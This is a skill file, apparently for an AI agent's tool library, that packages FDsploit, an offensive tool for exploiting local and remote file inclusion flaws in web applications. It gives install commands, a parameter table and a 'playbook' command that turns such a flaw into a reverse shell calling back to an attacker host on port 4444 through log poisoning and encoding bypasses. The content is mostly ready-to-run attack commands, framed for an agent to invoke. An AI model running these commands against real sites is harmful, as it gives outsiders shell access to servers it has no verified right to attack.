---
name: fdsploit-lfi-rfi
description: "FDsploit: automated LFI to shell. Signals: web vulnerability, injection, LFI/RFI detection and exploitation, encoding mode, reverse parameters."
zh-signals: "FDsploit: LFI 到 shell 自动化。信号:web漏洞,注入,LFI/RFI 检测利用,编码模式,反弹参数。"
when-to-use: >-
  Use when an authorized web application exposes a suspected LFI or RFI parameter and you
  want to automate detection, bypass and conversion to a reverse shell.
---

# FDsploit

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/chrispetrou/FDsploit
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/chrispetrou/FDsploit && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python FDsploit.py -u 'https://t.com/?file=home'` | LFI/RFI detection and exploitation |
| `-u url -p file -e php` | Encoding mode |
| `--lhost 10.0.0.5 --lport 4444` | Reverse connection parameters |
| `-o out.txt` | Output |

## Attack Scenario Playbook

### Automated LFI-to-Shell

```bash
python FDsploit.py -u 'https://t.com/index.php?page=about' --lhost 10.0.0.5 --lport 4444
# Automatically tries pseudo-protocols, log poisoning and encoding bypasses
```

## Notes

A dedicated LFI/RFI exploitation tool with multiple bypass and weaponization paths built in.
